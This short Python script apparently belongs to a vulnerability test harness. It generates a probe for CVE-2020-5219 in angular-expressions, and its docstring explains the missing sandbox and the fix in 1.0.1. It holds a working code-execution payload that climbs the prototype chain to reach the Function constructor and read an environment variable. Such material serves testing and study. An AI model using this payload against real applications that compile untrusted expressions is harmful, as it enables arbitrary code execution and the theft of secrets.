#!/usr/bin/env python3
"""[GIVEN] Original seed = CVE-2020-5219 (GHSA-hxhm-96pp-2m43).

angular-expressions < 1.0.1 removed AngularJS's expression sandbox entirely, so
an untrusted expression compiled with expressions.compile() can reach the
Function constructor through the prototype chain and run arbitrary JS. The
simplest form is the DOTTED `.constructor.constructor` access:

    constructor.constructor("return process.env.PCB_FLAG")()

On angular-expressions 1.0.0 (V0) this escapes the (absent) sandbox and reads
the planted environment canary. The CVE-2020-5219 fix (1.0.1) added an
Object.prototype.hasOwnProperty guard on member READs, so this DOTTED
prototype-chain access is BLOCKED on V1 -> the differential precondition.
"""


def candidate():
    return {
        "probe_id": "original-cve-2020-5219-dotted-constructor",
        # dotted .constructor.constructor -> Function -> read env canary
        "expr": 'constructor.constructor("return process.env.PCB_FLAG")()',
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
